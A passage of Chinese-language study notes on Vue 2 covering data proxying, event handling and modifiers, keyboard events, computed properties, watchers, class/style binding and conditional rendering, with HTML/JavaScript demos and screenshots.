    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     School: {{_data.name}} <br>
     Address: {{_data.address}}
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

      let data={
           name:'嘎腰子学院',
           address:'深圳湾一号'
         }

      const vm=new Vue({
        el:'#root' ,
        data
     });

     //vue实例上没有data属性 但有_data属性 想要验证_data 是否为 data对象
     //如果 满足 此关系 则可以说明 data === vm._data === 配置项的data

     console.log(vm);
    </script>
</body>
</html>
~~~

> 如果没有数据代理 那么代码需要这么写



**数据代理示意图：**

---

![image-20221015101112252](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151020129.png)

---

> vue会将 data中的键值对，通过Object.defineProperty()方法 添加到 vue实例上 此时可以通过 获取vue实例上的属性值获取data中的值，通过修改vue实例上的值修改data中的值





查看一下 _data：

---

![image-20221015102801273](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151028637.png)

---

> 这里为了实现 修改data中的数据，可以改变页面中的展示（响应式）。做了数据劫持（之后说）



小结：

1. Vue中的数据代理：通过vm对象来代理data对象中属性的操作（读/写）

2. Vue中数据代理的好处：更加方使的操作data中的数据

3. 基本原理：

   通过obiect.defineProperty() 把data对象中所有属性添加到vm上

   为每一个添加到vm上的属性，都指定一个getter/setter

   在getter/setter内部去操作（读/写）data中对应的属性



## 1.5 . 事件处理

### v-on:click

**不传参：**

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<script src='../js/vue.js'></script>
    <div id='root'>
     <button v-on:click="showInfo">点我提示信息1</button>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         },
         methods:{
            showInfo(event){//改函数由vue管理，调用时会给一个事件对象
                console.log(event);
                console.log(event.target);
                console.log(event.target.innerText);
                console.log(this);//这个vm是 vue实例对象
            }
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221015122052905](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151221440.png)

---







**传参：**

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
<script src='../js/vue.js'></script>
    <div id='root'>
     <button v-on:click="showInfo">点我提示信息1 不传参</button>
     <button v-on:click="showInfo2(33,$event)">点我提示信息2 传参</button>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         },
         methods:{
            showInfo(event){
                console.log(event);
                console.log(event.target);
                console.log(event.target.innerText);
                console.log(this);
            },
            showInfo2(param,event){
                    console.log('----------------------------');
                    console.log(event);
                    console.log(param);
            }
         }
     });
    </script>
</body>
</html>
~~~



----

![image-20221015122750487](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151229712.png)

---



事件的基本使用：
1.使用 v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
2.事件的回调需要配置在methods对象中，最终会在vm上;
3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
4.methods中配置的函数，都是被Vue所管理的函数，this的指向是 vm或 组件实例对象；
5.`@click=”demo”`和 @click=”demo（$event）”效果一致，但后者可以传参；



 

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- 使用事件修饰符 -->
     <a href="http://www.baidu.com" @click.prevent="showInf">点提</a>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         },
         methods:{
            showInf(event){
                // 传统js的做法  只提示信息，不进行页面跳转
                // event.preventDefault();
                alert('提示：');
            }
         }
     });
    </script>
</body>
</html>
~~~

> 只有提示，不会进行页面跳转





### 事件修饰符

Vue中的事件修饰待：

1. prevent：阻止默认事件（常用）

2. stop：阻止事件冒泡（常用）：

3. once：事件只触发一次（常用）

4. .capture：使用事件的捕获模式：

   先捕获，再冒泡。

   捕获是：从最外面的一个元素开始，逐步到触发事件的元素。

   冒泡是：从触发事件的元素开始，到最外面的元素

   要有相同类型的事件

5. self：只有event.target是当前操作的元素是才触发事件，

6. passive：事件的默认行为立即执行，无需等待事件回调执行完毕；



stop：阻止事件冒泡

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .demo1{
            height: 200px;
            background-color: aquamarine;
        }
        *{
            margin-top: 20px;
        }
    </style>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- 使用事件修饰符 -->
     <div class="demo1" @click="showInf">
        <!-- 点击的是按钮 最后冒泡到div身上 即：触发了两次点击事件 有两次提示-->
        <a @click.stop="showInf" href="#">演示事件冒泡问题</a>
     </div>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         },
         methods:{
            showInf(event){
                //传统js的做法 阻止事件冒泡:只有一次提示 而非两次
                // event.stopPropagation();
                alert('提示：');
            }
         }
     });
    </script>
</body>
</html>
~~~

> 事件修饰符可以连续写  类似链式编程





### 键盘事件

1  Vue中常用的按键别名：

~~~
回车 => enter
删除 =>delete（捕获“删除“和“退格“键）
退出 => esc
空格 => space
换行 => tab (特殊 必须配合keydown使用)
上=>up
F => down
左 => left
右 =>right
~~~

2  Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为 `kebab-case`（短横线命名)

3  系统修饰键（用法特殊）：ctrl、alt、shift、meta
（1）配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他健，事件才被触发，
（2）配合keydown使用：正常触发事件。

4 也可以使用keyCode去指定具体的按键（不推荐)

~~~
  <input type="text" @keyup.enter="showEnter" placeholder="按回车 提示输入的内容">
  <input type="text" @keyup.13="showEnter" placeholder="按回车 提示输入的内容">
~~~

5  Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名

~~~
 <input type="text" @keyup.huiche="showEnter" placeholder="按回车 提示输入的内容">
 <script type="text/javascript">
 	Vue.config.keyCodes.huiche=13;
 </script>
~~~



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- 给该元素绑定一个 键盘事件 当Enter键起来时，会触发事件 -->
        <input type="text" @keyup.enter="showEnter" placeholder="按回车 提示输入的内容">
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         },
         methods:{
            showEnter(event){
                //传统js操作
                //不是回车 不进行操作
                // if(event.keyCode!=13){
                //     return;
                // }
                console.log(event.target.value);
            }
         }
     });
    </script>
</body>
</html>
~~~

> 键盘事件也可以连续写：
>
> ctrl + y 且 y放开了才会触发

~~~
     <input type="text" @keyup.enter.y="showEnter" placeholder="按回车 提示输入的内容">
~~~





常用键如下：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- 给该元素绑定一个 键盘事件 当Enter键起来时，会触发事件 -->
        <input type="text" @keyup="showEnter" placeholder="按回车 提示输入的内容">
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         },
         methods:{
            showEnter(event){
                console.log(event.keyCode,event.key);
            }
         }
     });
    </script>
</body>
</html>
~~~

---

![image-20221015134724274](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151349602.png)

---



## 1.6 计算属性

为什么要使用计算属性？



Demo 姓名案例_插值语法实现:

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     姓：<input type="text" v-model="firstName"><br>
     名：<input type="text" v-model="lastName"><br>
     全名：{{firstName}}- {{lastName}}
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({ 
       el:'#root' ,
       data:{
            lastName:'三',
            firstName:"张"
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221015140432255](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151404087.png)

---





Demo methods实现姓名案例:

~~~HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     姓：<input type="text" v-model="firstName"><br>
     名：<input type="text" v-model="lastName"><br>
     <!-- 这里应该带上括号，右括号说明是调用函数 获取返回值 没有括号说明是输出vue实例的函数的信息 -->
     全名：{{fullName()}} <br>
     全名：{{fullName}}
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({ 
       el:'#root' ,
       data:{
            lastName:'三',
            firstName:"张"
         },
         methods:{
            fullName(){
                return this.firstName +'-' + this.lastName;
            }
         }
     });
    </script>
</body>
</html>
~~~

---

![image-20221015141447431](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151414724.png)

---

> 只要data中的数据发生改变，就会重新渲染模板









​	Demo : 计算属性实现 姓名案例

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     姓：<input type="text" v-model="firstName"><br>
     名：<input type="text" v-model="lastName"><br>
  
     全名：{{fullName}} <br>
     全名：{{fullName}}
    </div>


    <script type='text/javascript'>
      Vue.config.productionTip = false
      let vm=new Vue({ 
       el:'#root' ,
       data:{
            lastName:'三',
            firstName:"张"
         },
computed:{
    fullName:{
        //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
        //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时
        get(){
            console.log('@ getter被调用');
            //这里的this是 vm
            return this.firstName +'-' +this.lastName;
        },
        //set什么时候调用？当fu1IName被修改时
        set(value){
            console.log('setter被调用');
            let arr=value.split('-');
            this.firstName= arr[0];
            this.lastName=arr[1];
        }
    }
}
     });
    </script>
</body>
</html>
~~~

----

![image-20221015143942606](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151439633.png)

---



---

![image-20221015144517716](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151445246.png)

---



计算属性简写：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     姓：<input type="text" v-model="firstName"><br>
     名：<input type="text" v-model="lastName"><br>
  
     全名：{{fullName}} <br>
     全名：{{fullName}}
    </div>


    <script type='text/javascript'>
      Vue.config.productionTip = false
      let vm=new Vue({ 
       el:'#root' ,
       data:{
            lastName:'三',
            firstName:"张"
         },
        computed:{
                    //完整写法
                    // fullName:{
                    //     //get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
                    //     //get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时
                    //     get(){
                    //         console.log('@ getter被调用');
                    //         //这里的this是 vm
                    //         return this.firstName +'-' +this.lastName;
                    //     },
                    //     //set什么时候调用？当fu1IName被修改时
                    //     set(value){
                    //         console.log('setter被调用');
                    //         let arr=value.split('-');
                    //         this.firstName= arr[0];
                    //         this.lastName=arr[1];
                    //     }
                    // }

                    //简写 （使用场景：只读不写）
                    fullName(){
                        return this.firstName +'-' +this.lastName;
                    }
        }
     });
    </script>
</body>
</html>
~~~



计算属性：
1 定义：要用的属性不存在，要通过已有属性计算得来
2 原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
3 get函数什么时候执行？（1）初次读取时会执行一次，（2）当依赖的数据发生改变时会被再次调用。
4 优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方伍
5.备注：
       计算属性最终会出现在vm上，直接读取使用即可
       如果计算属性要被修改，那必须写set函数去响应修改，目set中要引起计算时 **依赖的数据** 发生变化







Demo 使用计算属性完成 天气案例

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>

     <!-- <h1>今天天气很 {{isHot?'炎热':'凉爽'}},{{count}}</h1> -->
     <h1>今天天气很 {{info}},{{count}}</h1>
     <button @click="change">切换</button>

     <!--绑定事件的时候：@xxx=”yyy” yyy可以写一些简单的语句-->
     <!-- <button @click="isHot=!isHot;count++">切换</button> -->


    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

      new Vue({
       el:'#root' ,
       data:{
          isHot:true,
          count:1
         },

         //通过方法改变 data中的值 从而实现页面上的数据的变化
         methods: {
            change(){
               this.isHot=!this.isHot;
               this.count++;
            }
         },
         
         //维护一个计算属性 的到 值
         computed:{
                info(){
                    return this.isHot?'炎热':'凉爽';
                }
         }
     });
    </script>
</body>
</html>
~~~



## 1.7 监视属性

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>

     <h1>今天天气很 {{info}},{{count}}</h1>
     <button @click="change">切换</button>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

     const vm= new Vue({
       el:'#root' ,
       data:{
          isHot:true,
          count:1
         },

         //通过方法改变 data中的值 从而实现页面上的数据的变化
         methods: {
            change(){
               this.isHot=!this.isHot;
               this.count++;
            }
         },
         
         //维护一个计算属性 的到 值
         computed:{
                info(){
                    return this.isHot?'炎热':'凉爽';
                }
         },
         //第一种书写 监视属性方法
/*          watch:{
            //这里 既可以监视 data中的数据 也可以监视计算属性
            isHot:{
                //初始化时让handler调用
                immediate:true,

                //handler什么时候调用？当isHot发生改变时
                handler(oldVal,newVal){
                    console.log('isHot 被修改了',oldVal,newVal)
                }
            }
         } */
     });


    //第二种书写 监视属性的方法
     vm.$watch('isHot',{
         //初始化时让handler调用
         immediate:true,

        //handler什么时候调用？当isHot发生改变时
        handler(oldVal,newVal){
            console.log('isHot 被修改了',oldVal,newVal)
}
     });

    </script>
</body>
</html>
~~~

---

![image-20221015161213407](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151612387.png)

---



### 深度监视：

（1）Vue中的watch默认不监测对象内部值的改变（一层）
（2）配置deep:true可以监测对象内部值改变（多层）
备注：
（1）Vue自身可以监测对象内部值的改变，但vue提供的watch默认不可以！
（2）使用watch时根据数据的具体结构，决定是否采用深度监视



问题引出：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     <button @click="number.a++">点我使a加一</button> {{number.a}} <br>
     <button @click="number.b++">点我使b加一</button> {{number.b}}<br>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

     const vm= new Vue({
       el:'#root' ,
       data:{
          isHot:true,
          count:1,
          number:{
            a:10,
            b:20,
            c:{
                d:{
                    e:7
                }
            }
          }
         },
         watch:{
            'number.a':{
                handler(oldVal,newVal){
                    console.log('a 被修改了',oldVal,newVal)
                }
            },

            'number.b':{
                handler(oldVal,newVal){
                    console.log('b 被修改了',oldVal,newVal)
                }
            }
         }
     });
    </script>
</body>
</html>
~~~

> 这样是可以的

---

![image-20221015163439020](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151634321.png)

---



但这么做就会出现问题：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     <button @click="number.a++">点我使a加一</button> {{number.a}} <br>
     <button @click="number.b++">点我使b加一</button> {{number.b}}<br>
     <button @click="number={a:100,b:100};isHot=false">点我使number的地址改变</button>{{isHot?'没变':'变了'}} <br>
        
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

     const vm= new Vue({
       el:'#root' ,
       data:{
          isHot:true,
          count:1,
          number:{
            a:10,
            b:20,
            c:{
                d:{
                    e:7
                }
            }
          }
         },
         watch:{
            number:{
                handler(oldVal,newVal){
                    console.log('number 被修改了',oldVal,newVal)
                }
            }
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221015164116309](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151641921.png)

----



---

![image-20221015164351330](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151643655.png)

---

> 原因：number的值 



添加一个配置项属性解决该问题：



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     <button @click="number.a++">点我使a加一</button> {{number.a}} <br>
     <button @click="number.b++">点我使b加一</button> {{number.b}}<br>
     <button @click="number={a:100,b:100};isHot=false">点我使number的地址改变</button>{{isHot?'没变':'变了'}} <br>
        
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false;

     const vm= new Vue({
       el:'#root' ,
       data:{
          isHot:true,
          count:1,
          number:{
            a:10,
            b:20,
            c:{
                d:{
                    e:7
                }
            }
          }
         },
         watch:{
            number:{
                //监视多级结构中所有属性的变化
                deep:true,
                handler(oldVal,newVal){
                    console.log('number 被修改了',oldVal,newVal)
                }
            }
         }
     });
    </script>
</body>
</html>
~~~



---

![image-20221015164843783](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151648689.png)

---

### 监视简写

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
    <h1>今天天气{{info}}</h1>
    <button @click="change">点击改变天气</button>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      const vm=new Vue({
       el:'#root' ,
       data:{
           isHot:false
         },
         computed:{
            info(){
                return this.isHot?'炎热':'凉爽';
            }
         },
         methods: {
            change(){
                this.isHot=!this.isHot;
            }
         },

         //监视属性的第一种写法
         watch:{
               // 正常写法
     /*        isHot:{
                // immediate:true,//初始化时让handler调用
                // deep:true.//深度监视
                handler(newVal,oldVal){//当只有handler时可以简写
                console.log('天气已改');
                }
            } */



            // 简写
        /*     isHot(newVal,oldVal){
                console.log('天气已改');
            } */
         }
     });


            //监视属性的第二种写法 普通写法
/*             vm.$watch('isHot',{
                            immediate:true,//初始化时让handler调用
                            deep:true,//深度监视
                            handler(newVal,oldVal){//当只有handler时可以简写
                            console.log('天气已改')
                            }
            }); */

            //监视属性的第二种写法 简写
            vm.$watch('isHot',function(newVal,oldVal){
                console.log('天气已改');
            });


    </script>
</body>
</html>
~~~

---

![image-20221015191129838](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151911378.png)

---







### 对比监视属性与计算属性：

监视属性Demo：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     姓：<input type="text" v-model="firstName"><br>
     名：<input type="text" v-model="lastName"><br>
  
     全名：{{fullName}} <br>
     全名：{{fullName}}
    </div>


    <script type='text/javascript'>
      Vue.config.productionTip = false
      let vm=new Vue({ 
       el:'#root' ,
       data:{
            lastName:'三',
            firstName:"张",
            fullName:''
         },
         watch:{
            lastName(v){
                this.fullName=this.firstName + v ;
            },
            firstName(v){
                this.fullName=v + this.lastName;
            }
            
         }
     });
    </script>
</body>
</html>
~~~

----

![image-20221015192049988](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151921070.png)

---





计算属性Demo：

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     姓：<input type="text" v-model="firstName"><br>
     名：<input type="text" v-model="lastName"><br>
  
     全名：{{fullName}} <br>
     全名：{{fullName}}
    </div>


    <script type='text/javascript'>
      Vue.config.productionTip = false
      let vm=new Vue({ 
       el:'#root' ,
       data:{
            lastName:'三',
            firstName:"张"
         },
        computed:{
                    fullName(){
                        return this.firstName +'-' +this.lastName;
                    }
        }
     });
    </script>
</body>
</html>
~~~

----

![image-20221015193442322](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210151934414.png)

----



computed 与 watch之间的区别：
1.computed能完成的功能，watch都可以完成
2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作.
两个重要的小原则：
1.所被vue管理的函数，最好写成普通函数，这样this的指向才是vn或 组件实例对象。
2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调丽数），最好写成箭头函数这样this的指向才是vm 或 组件实例对象





## 1.8. class 与 style 绑定



### 理解 

1. 在应用界面中, 某个(些)元素的样式是变化的 
2. class/style 绑定就是专门用来实现动态样式效果的技术



### class 绑定

1. :class='xxx' 
2. xxx是字符串: 'classA' 
3. xxx是对象: {classA:isA, classB: isB}

4. 表达式是数组: ['classA', 'classB']





### style 绑定

1. :style="{ color: activeColor, fontSize: fontSize + 'px' }"
2. 其中 activeColor/fontSize 是 data 属



~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <style>
        .basic{
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }
        
        .happy{
            border: 4px solid red;;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg,yellow,pink,orange,yellow);
        }
        .sad{
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }
        .normal{
            background-color: skyblue;
        }

        .atguigu1{
            background-color: yellowgreen;
        }
        .atguigu2{
            font-size: 30px;
            text-shadow:2px 2px 10px red;
        }
        .atguigu3{
            border-radius: 20px;
        }
    </style>
</head>
<body>
       <script src='../js/vue.js'></script>
    <div id='root'>
     <!-- 要用vue实现这种 且点击该div后 normal变成 happy-->
     <!-- <div class="basic normal" @click="changeMood"> -->

         <!-- 绑定css样式 字符串写法 适用于类名不确定 需要动态指定 -->
        <div class="basic" v-bind:class="mood" v-on:click="changeMood">
            绑定css样式 字符串写法
        </div>

        <!--绑定css样式 数组写法 个数不确定 名称不确定 -->
        <div class="basic" v-bind:class="classArr">
            绑定css样式 数组写法
        </div>


        <!--绑定css样式 对象写法 知到从那几个中确定 -->
        <div class="basic" v-bind:class="classObj" >
            绑定css样式 对象写法
        </div>


           <!--绑定style样式 对象写法 -->
           <div class="basic" v-bind:style="styleObj">
                绑定内联css样式 对象写法 
           </div>


           
           <!--绑定style样式 数组写法 -->
           <div class="basic" v-bind:style="stylejArr">
                绑定内联css样式 数组写法 
           </div>

     </div>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           mood:'normal',
           classArr:['normal','sad','happy'],
           classObj:{
                atguigu3:false,
                atguigu1:true
           },
           styleObj:{
            fontSize:'30px',
            color:'red',
            backgroundColor:'gray'
           },
           stylejArr:[
            {
                color:'white',
                backgroundColor:'gray'
            },
            {
                fontSize:'33px',
            }
           ]
         },
         methods: {
            changeMood(){
                const arr=['normal','sad','happy'];
                let index = Math.floor(Math.random()*3);
                this.mood=arr[index];
            }
         },
     });
    </script>
</body>
</html>
~~~

绑定样式：

1. c1ass样式
   写法：`:class="xxx”`  xxx可以是字符串、对象、数组.
    		字符串写法适用于 类名不确定，要动态获取。
   		对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
   		数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用
   2.style样式
   `:style` ="ffontSize：xxx}"其中xxx是动态值，
   `:style` ="[a，b]"其中a、b是样式对象 【样式对象规定了key的值，不可以乱写】





## 1.9. 条件渲染

### 使用v-show做条件渲染

~~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- 使用v-show做条件渲染 -->
     <div v-show="false">使用v-show做条件渲染 </div>
     <div v-show="1===1">使用v-show做条件渲染 </div>



    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         }
     });
    </script>
</body>
</html>
~~~~

----

![image-20221015203507575](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152035247.png)

----

### 使用v-if做条件渲染 

~~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- 使用v-if做条件渲染 -->
        <div v-if="false">使用v-if做条件渲染</div>
        <div v-if="1===1">使用v-if做条件渲染</div>
    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa'
         }
     });
    </script>
</body>
</html>
~~~~



----

![image-20221015203736974](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152037065.png)

---











~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- v-if v-else-if v-else  这个结构一定要是连续的-->
        <button v-on:click="n++">点我n+1</button>{{n}}
        <div v-if="n===1">Angular</div>
        <!-- <div>@</div>打断会报错 -->
        <div v-else-if="n===2">React</div>
        <!-- <div>@</div>打断会报错 -->
        <div v-else>Vue</div>

    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa',
           n:0
         }
     });
    </script>
</body>
</html>
~~~

---

![image-20221015211953108](https://cdn.jsdelivr.net/gh/fgcy-333/gitnote-images/2022/8/27202210152120348.png)

---



### v-if 与 template的配合使用 

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <script src='../js/vue.js'></script>
    <div id='root'>
        <!-- v-if 与 template的配合使用 且只能与v-if-->
        <template v-if="n===1">
            <h1>Angular</h1>
            <h1>React</h1>
            <h1>Vue</h1>
        </template>



    </div>
    <script type='text/javascript'>
      Vue.config.productionTip = false
      new Vue({
       el:'#root' ,
       data:{
           name:'aaaa',
           n:0
         }
     });
    </script>
</body>
</html>
~~~



条件渲染：
1 v-if 写法：
（1）v-if="表法式
（2）v-else-if="表达式’
（3）v-else="表达式”
适用干：切换频率较低的场景，特点：不展示的DOM元素直接被移除。
注意：v-if可以与 v-e1se-if、v-else一起使用，但要求结构不能被"打断”

2.v-show写法：v-show="表达式"
适用于：切换频率较高的场景。
特点：不展示的DOM元素未被移除，仅仅是体用样式隐藏掉

